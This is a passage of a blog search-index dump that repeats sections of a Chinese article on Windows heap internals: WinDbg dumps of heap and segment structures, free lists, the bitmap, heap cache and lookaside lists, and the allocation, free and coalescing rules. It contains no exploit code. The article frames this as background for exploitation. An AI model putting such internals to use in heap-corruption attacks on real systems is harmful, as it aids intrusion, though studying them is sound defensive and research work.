AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#空表位图"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆缓存"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#快表"},{"categories":[],"content":"\r堆的管理策略在内存中，堆块按大小分为 3 种，分别为小块 (\u003c1KB)、大块 (\u003c512KB) 和巨块 (≥512KB)，堆块间主要存在 3 中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。 后端堆管理策略从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除 0 号空表外的所有空表都遍历完仍然没有分配成功，则判断 0 号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从 0 号空表中正向查找满足分配大小的最小堆块进行分配。 前端堆管理策略从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。 堆块分配堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。 堆的分配被划分为前端堆管理器 (Front-End Manager) 和后端堆管理器 (Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。 在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从 0 号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从 0 号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如下图所示。 堆块释放堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入 0 号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了 4 个空闲堆块，则将该堆块链入对应大小的空表中。 堆块合并在进行堆块释放时，若释放堆块直接进入空表（链接在快表中的空闲堆块不会进行合并操作），并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆的管理策略"},{"categories":[],"content":"\r堆的管理策略在内存中，堆块按大小分为 3 种，分别为小块 (\u003c1KB)、大块 (\u003c512KB) 和巨块 (≥512KB)，堆块间主要存在 3 中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。 后端堆管理策略从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除 0 号空表外的所有空表都遍历完仍然没有分配成功，则判断 0 号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从 0 号空表中正向查找满足分配大小的最小堆块进行分配。 前端堆管理策略从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。 堆块分配堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。 堆的分配被划分为前端堆管理器 (Front-End Manager) 和后端堆管理器 (Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。 在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从 0 号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从 0 号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如下图所示。 堆块释放堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入 0 号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了 4 个空闲堆块，则将该堆块链入对应大小的空表中。 堆块合并在进行堆块释放时，若释放堆块直接进入空表（链接在快表中的空闲堆块不会进行合并操作），并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#后端堆管理策略"},{"categories":[],"content":"\r堆的管理策略在内存中，堆块按大小分为 3 种，分别为小块 (\u003c1KB)、大块 (\u003c512KB) 和巨块 (≥512KB)，堆块间主要存在 3 中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。 后端堆管理策略从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除 0 号空表外的所有空表都遍历完仍然没有分配成功，则判断 0 号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从 0 号空表中正向查找满足分配大小的最小堆块进行分配。 前端堆管理策略从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。 堆块分配堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。 堆的分配被划分为前端堆管理器 (Front-End Manager) 和后端堆管理器 (Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。 在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从 0 号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从 0 号空表中寻找最适合的空闲快进行分配，若依然失败，则会先进行内存紧缩后再尝试分配。堆块分配流程如下图所示。 堆块释放堆块释放，即将堆块从占用状态更改为空闲状态。在准备释放某一大小的内存空间时，首先会判断释放释放的堆块是否属于巨块范畴，若是巨块，则直接将该空间释放，不会进入任何堆表。若是大块，则尝试将其释放入堆缓存，若堆缓存已满，则链入 0 号空表。若是小块，则首先尝试链入对应大小的快表，若链入快表，为了加快堆块的分配，系统不会更改其占用状态。若对应大小的快表中已经链满了 4 个空闲堆块，则将该堆块链入对应大小的空表中。 堆块合并在进行堆块释放时，若释放堆块直接进入空表（链接在快表中的空闲堆块不会进行合并操作），并且与该堆块物理地址相邻的堆块同为空闲态，则会进行堆块的合并。在进行堆块合并时，会将堆块从空表中卸下，将两个相邻的内存空间整合后更新新空闲堆块的堆头信息，并根据新空闲堆块的大小链入相应大小的空表中。除了堆块的释放会触发堆块合并外，在申请堆块时，若未成功从快表、堆缓存及空表中分配空间，则会触发内存紧缩。内存紧缩会将堆空间中的所有空闲堆块，无论地址是否连续，都整合成一个大的空闲堆块再进行堆块分配。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:2","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#前端堆管理策略"},{"categories":[],"content":"\r堆的管理策略在内存中，堆块按大小分为 3 种，分别为小块 (\u003c1KB)、大块 (\u003c512KB) 和巨块 (≥512KB)，堆块间主要存在 3 中操作方式，分别是堆块的分配、堆块的释放、堆块的合并。 后端堆管理策略从空表进行堆块分配时，首先会找到维护对应大小的空表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将空表头的后项指针指向被卸下的堆块的后项堆块。若对应大小的空表内分配失败，则会寻找次优项，在下一个空表中进行分配，直到寻找到能够满足内存分配的最小内存的空闲堆块。当在空表中寻找次优项成功时，会进行切割分配，即从找到的较大堆块中切割下申请大小的堆块分配给程序使用，并将切割剩余的部分按大小加上堆头链入对应的空表。若将所有除 0 号空表外的所有空表都遍历完仍然没有分配成功，则判断 0 号空表中的最后一个堆块大小是否大于所需分配内存大小，若大于则从 0 号空表中正向查找满足分配大小的最小堆块进行分配。 前端堆管理策略从快表进行堆块分配时，首先会通过用户申请堆块大小索引到维护对应大小的快表，将最后链入表中的空闲堆块从表中卸下，分配给用户使用，并将快表头指向后项空闲堆块。 堆块分配堆块在进行分配时，主要会从上文提到的快表和空表中进行分配。 堆的分配被划分为前端堆管理器 (Front-End Manager) 和后端堆管理器 (Back-End Manager)，其中前端堆管理器主要由上文中提到的快表有关的分配机制构成，后端堆管理器则是由空表有关的分配机制构成。 在用户申请分配某一大小的内存空间时，系统会首先判断申请的堆块是否属于巨块范畴，若是巨块，则采用虚分配，在漏洞利用中遇到较少，本文不予讨论。若申请大块，则首先考虑堆缓存进行分配，若分配不成功，则从 0 号空表中寻找最合适的空闲块进行分配。若申请小块，则首先查看对应大小的快表中有没有空闲的堆块，若无则查看对应大小的空表中有没有空闲的堆块，若无则通过空表位图查找更大的空表中有没有空闲的堆块进行切割分配，若无则采用堆缓存进行分配，若分配失败，则从 0 